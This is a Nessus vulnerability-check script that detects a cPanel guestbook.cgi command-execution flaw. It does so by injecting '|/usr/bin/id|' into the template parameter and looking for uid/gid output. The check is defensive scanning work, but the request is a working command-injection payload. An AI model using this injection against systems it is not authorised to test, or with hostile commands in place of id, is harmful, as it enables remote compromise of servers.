# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# *untested*
#
# Message-ID: <3E530C7A.9020608@scan-associates.net>
# From: pokleyzz <pokleyzz@scan-associates.net>
# To: bugtraq@securityfocus.org
# Subject: Cpanel 5 and below remote command execution and local root
#           vulnerabilities
#
# 



if(description)
{
 script_id(11281);
 script_version ("$Revision: 1.1 $");
 script_bugtraq_id(6882);
 
 name["english"] = "cpanel remote command execution";
 script_name(english:name["english"]);
 
 desc["english"] = "
cpanel is installed and does not properly filter user input.
A cracker may use this flaw to execute any command on your system.

Solution : Upgrade to cpanel 6.0
Risk factor : High";



 script_description(english:desc["english"]);
 
 summary["english"] = "Executes /bin/id";
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2003 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2003 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#

include("http_func.inc");
include("http_keepalive.inc");


function check(port, cmd)
{
 req = http_get(item:string("/cgi-sys/guestbook.cgi?user=cpanel&template=|", cmd, "|"),
	       port:port);
 resp = http_keepalive_send_recv(port:port, data:req);
 if(resp == NULL)exit(0);

 if(("uid=" >< resp) && ("gid=" >< resp)){
	security_hole(port);
	exit(0);
	}		       
}


port = get_kb_item("Services/www");
if(!port) port = 80;


check(port:port, cmd:"/usr/bin/id");
check(port:port, cmd:"/bin/id");
